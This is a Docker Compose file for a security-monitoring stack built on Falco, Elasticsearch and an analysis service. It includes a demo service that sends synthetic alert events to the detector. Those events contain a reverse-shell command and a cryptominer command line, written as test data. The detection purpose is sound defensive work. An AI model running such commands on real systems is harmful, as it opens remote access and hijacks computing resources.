services:
  gateway:
    build:
      context: ../kernelharbor-openclaw
      dockerfile: ../deploy/Dockerfile.gateway
    ports:
      - "8181:8181"
      - "28080:28080"
      - "28079:28079"
    environment:
      KH_DASHBOARD_PORT: "8181"
      KH_ANALYSIS_HTTP_ADDR: "analysis:8080"
      KH_PLUGIN_CONFIG: >-
        {"analysisAddr":"analysis:9090","dashboardPort":8181,"autoStart":true,
        "falcoSidekickPort":2801,"falcoWebhookPort":28080,"signerPort":28079,
        "signingSecret":"${KH_SIGNING_SECRET:-kh-demo-secret}"}
    volumes:
      - ../kernelharbor-openclaw/rules:/app/rules:ro
    depends_on:
      analysis:
        condition: service_started
    networks:
      - kernelharbor
    restart: unless-stopped

  analysis:
    image: kernelharbor/analysis:latest
    build:
      context: ..
      dockerfile: deploy/Dockerfile.analysis
    ports:
      - "8080:8080"
      - "9090:9090"
    environment:
      GRPC_ADDRESS: ":9090"
      HTTP_ADDRESS: ":8080"
      PROTOCOL: "both"
      KH_API_KEY: "${KH_API_KEY:-}"
      ES_ADDRESSES: "http://elasticsearch:9200"
      LLM_BACKEND: "${KH_LLM_BACKEND:-none}"
      LLM_THRESHOLD: "${LLM_THRESHOLD:-0.6}"
      OLLAMA_ADDRESS: "http://ollama:11434"
      OLLAMA_MODEL: "${OLLAMA_MODEL:-qwen2.5:7b}"
    depends_on:
      elasticsearch:
        condition: service_healthy
    networks:
      - kernelharbor
    restart: unless-stopped

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.17.4
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9200/_cluster/health"]
      interval: 15s
      timeout: 5s
      retries: 10
    volumes:
      - es-data:/usr/share/elasticsearch/data
    networks:
      - kernelharbor
    restart: unless-stopped

  falcosidekick:
    image: falcosecurity/falcosidekick:latest
    ports:
      - "2801:2801"
    environment:
      LISTENPORT: "2801"
      DEBUG: "${FALCOSIDEKICK_DEBUG:-true}"
      WEBHOOK_ADDRESS: "http://gateway:28079/falco/event"
    depends_on:
      - gateway
    networks:
      - kernelharbor
    restart: unless-stopped

  falco:
    image: falcosecurity/falco:latest
    privileged: true
    pid: host
    volumes:
      - ./rules/kernelharbor-rules.yaml:/etc/falco/rules.d/kernelharbor-rules.yaml:ro
      - /proc:/host/proc:ro
      - /boot:/host/boot:ro
      - /lib/modules:/host/lib/modules:ro
      - /usr:/host/usr:ro
      - /etc:/host/etc:ro
    command: >
      falco -r /etc/falco/rules.d/kernelharbor-rules.yaml
      -o json_output=true
      -o json_include_output_property=false
      -o json_include_tags_property=true
      -o stdout_output.enabled=false
      -o http_output.enabled=true
      -o http_output.url=http://falcosidekick:2801/
    depends_on:
      - falcosidekick
    networks:
      - kernelharbor
    restart: unless-stopped

  ollama:
    image: ollama/ollama:latest
    ports:
      - "11434:11434"
    volumes:
      - ollama-data:/root/.ollama
    networks:
      - kernelharbor
    restart: unless-stopped
    profiles:
      - llm

  demo-sender:
    image: curlimages/curl:latest
    profiles:
      - demo
    depends_on:
      - analysis
    networks:
      - kernelharbor
    entrypoint: >
      sh -c '
        echo "Sending demo events to analysis..."
        TS=$$(date -u +"%%Y-%%m-%%dT%%H:%%M:%%S.000Z")
        curl -s -X POST http://analysis:8080/ingest -H "Content-Type: application/json" -d "[{\"@timestamp\":\"$$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\"image.path\":\"/usr/bin/bash\",\"process.pid\":3001,\"parent.pid\":1,\"user.name\":\"nobody\"}]"
        sleep 2
        curl -s -X POST http://analysis:8080/ingest -H "Content-Type: application/json" -d "[{\"@timestamp\":\"$$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"/tmp/.hidden/xmrig --url=stratum+tcp://pool.minexmr.com:443\",\"image.path\":\"/tmp/.hidden/xmrig\",\"process.pid\":4001,\"parent.pid\":1,\"user.name\":\"nobody\"}]"
        sleep 2
        echo "Demo events sent. Check dashboard: http://localhost:8181"
        curl -s http://analysis:8080/api/alerts?since=24h | head -c 500
      '

volumes:
  es-data:
  ollama-data:

networks:
  kernelharbor:
